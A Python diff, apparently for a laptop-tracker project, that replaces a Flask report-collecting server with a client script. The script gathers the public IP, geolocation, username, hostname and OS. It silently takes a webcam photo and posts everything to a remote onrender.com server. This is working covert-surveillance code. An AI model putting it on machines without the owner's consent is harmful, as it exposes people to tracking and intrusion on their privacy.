@@ -1,65 +1,63 @@
-from flask import Flask, request, render_template, send_from_directory
-import os
+import requests
+import socket
+import platform
+import getpass
 import json
+import os
 from datetime import datetime
+from PIL import ImageGrab
+import cv2
 
-app = Flask(__name__)
-UPLOAD_FOLDER = os.path.join("static", "uploads")
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+def obtener_ip_publica():
+    try:
+        return requests.get("https://api.ipify.org").text
+    except:
+        return "No disponible"
 
-@app.route("/")
-def index():
-    if not os.path.exists("reportes.json"):
-        with open("reportes.json", "w") as f:
-            json.dump([], f)
+def obtener_geo(ip):
+    try:
+        res = requests.get(f"https://ipinfo.io/{ip}/json").json()
+        return res
+    except:
+        return {}
 
-    with open("reportes.json", "r") as f:
-        reportes = json.load(f)
-    return render_template("index.html", reportes=reportes)
-
-@app.route("/report", methods=["POST"])
-def report():
-    ip = request.form.get("ip", "No recibido")
-    username = request.form.get("username", "No recibido")
-    system_info = request.form.get("system_info", "No recibido")
-    hostname = request.form.get("hostname", "N/A")
-    ciudad = request.form.get("ciudad", "N/A")
-    region = request.form.get("region", "N/A")
-    pais = request.form.get("pais", "N/A")
-    loc = request.form.get("loc", "N/A")
-    hora = request.form.get("hora", str(datetime.now()))
-    
-    filename = None
-    image = request.files.get("image")
-    if image:
-        filename = datetime.now().strftime("%Y%m%d%H%M%S") + ".jpg"
-        image.save(os.path.join(UPLOAD_FOLDER, filename))
-    
-    reporte = {
+def recolectar_info():
+    ip = obtener_ip_publica()
+    geo = obtener_geo(ip)
+    return {
         "ip": ip,
-        "username": username,
-        "system_info": system_info,
-        "hostname": hostname,
-        "ciudad": ciudad,
-        "region": region,
-        "pais": pais,
-        "loc": loc,
-        "hora": hora,
-        "imagen": filename
+        "username": getpass.getuser(),
+        "system_info": f"{platform.system()} {platform.release()}",
+        "hostname": socket.gethostname(),
+        "ciudad": geo.get("city", "N/A"),
+        "region": geo.get("region", "N/A"),
+        "pais": geo.get("country", "N/A"),
+        "loc": geo.get("loc", "N/A"),
+        "hora": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     }
 
-    with open("reportes.json", "r") as f:
-        datos = json.load(f)
-    datos.insert(0, reporte)
-    with open("reportes.json", "w") as f:
-        json.dump(datos, f, indent=2)
+def capturar_webcam(nombre_archivo="webcam.jpg"):
+    try:
+        cam = cv2.VideoCapture(0)
+        ret, frame = cam.read()
+        if ret:
+            cv2.imwrite(nombre_archivo, frame)
+        cam.release()
+    except:
+        pass
 
-    return "Reporte recibido"
+def enviar_reporte():
+    datos = recolectar_info()
+    capturar_webcam("webcam.jpg")
 
-@app.route("/uploads/<filename>")
-def uploaded_file(filename):
-    return send_from_directory(UPLOAD_FOLDER, filename)
+    with open("webcam.jpg", "rb") as img:
+        files = {"image": img}
+        response = requests.post(
+            "https://laptop-tracker-server.onrender.com/report",  # Cambia por tu URL si es diferente
+            data=datos,
+            files=files
+        )
+    print("Respuesta del servidor:", response.status_code, response.text)
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))  # Render necesita este puerto
-    app.run(host="0.0.0.0", port=port)
+    enviar_reporte()
